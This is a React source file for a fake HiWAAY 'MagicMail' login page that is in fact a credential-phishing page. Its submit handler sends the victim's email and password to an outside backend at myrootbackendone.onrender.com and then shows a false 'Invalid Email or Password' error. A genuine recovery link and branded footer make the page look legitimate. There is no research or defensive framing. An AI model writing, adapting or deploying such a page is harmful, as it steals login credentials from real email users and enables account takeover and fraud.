import React from 'react';
import './home.css';

import logo from './logo.png';

import { useState } from 'react';
import magic from './magic.png';

import axios from 'axios';

function Home(){
    const[email, setEmail] = useState("");

    const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');

  const[platform, setPlatform] = useState("Hiwaay")

  const[showError, setShowError] = useState(false);

  const handleCheckboxChange = () => {
    setShowPassword(!showPassword);
  }


  async function handleSubmit(e){
      e.preventDefault();

      try {
        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            setShowError(true);
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
  }
    return (
        <>

{showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
            <div className='main col-md-11 m-auto px-5'>

                <img src={logo} className="logo" />

                <div className='innerdiv px-3 row'>
                    <div className='col-md-6 pt-3'>
                        <h1 className='heading'>Log In to Access Your Account</h1>

                       

                        <p className='content text-justify'>
                        Welcome to your HiWAAY email account! For quick access to manage your email and settings, enter your email address and password in the form on the right, and then click on the login button.
                        </p>

                        

                        

                    </div>


                    <div className='col-md-6 pt-4'>

                        <div className='formdiv px-5 py-2 m-auto'>


                            <form onSubmit={handleSubmit}>
                                <h3 className='headingtwo text-center'>Login to MagicMail</h3>

                                <hr
                        style={{
                        background: 'grey',
                        color: 'grey',
                        borderColor: 'grey',
                        height: '0.2px',
                        }}
                    />


                            <div className='form-group'>
                                <label className='label'>Email:</label>
                                <input onChange={function(e){
                                    setEmail(e.target.value)
                                }} value={email} style={{
                                    height:"30px",
                                }} type="email" className='form-control'required />

                            </div>


                            <div className='form-group'>
                                <label className='label'>Password:</label>
                                <input onChange={function(e){
                                    setPassword(e.target.value);
                                }}value={password} style={{
                                    height:"30px",
                                }}  type={showPassword ? 'text' : 'password'} className='form-control'required />

                            </div>

                            <div className='form-group'>
                                
                                <input checked={showPassword}
                                    onChange={handleCheckboxChange}  type="checkbox" /><span className='px-1 label'>Show Password</span>

                            </div>

                            <div className='form-group'>
                                
                                <a href='https://mail.hiwaay.net/recover-password.php' className='forgot'>Forgot Password ?</a>

                            </div>

                            <div className='form-group row buttondiv'>
                                
                                <div className='col-6 text-left'>
                                    <img src={magic} />
                                </div>

                                <div className='col-6 text-right'>
                                    <button type="submit"className='btn submit'>Login</button>
                                </div>

                            </div>

                            </form>

                        </div>
                        
                    </div>




                </div>

                

               
            </div>
            <div className='col-md-11 m-auto footer'>
                <p className='footerp'>P.O. Box 86, Huntsville, AL. 35804 <br/>
Call Us: 18882449229<br/>

Text Us: 12128844400 <br/>
</p>

<p className='footertwo py-2'>MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.</p>


            </div>
            
        </>
    );
}

export default Home;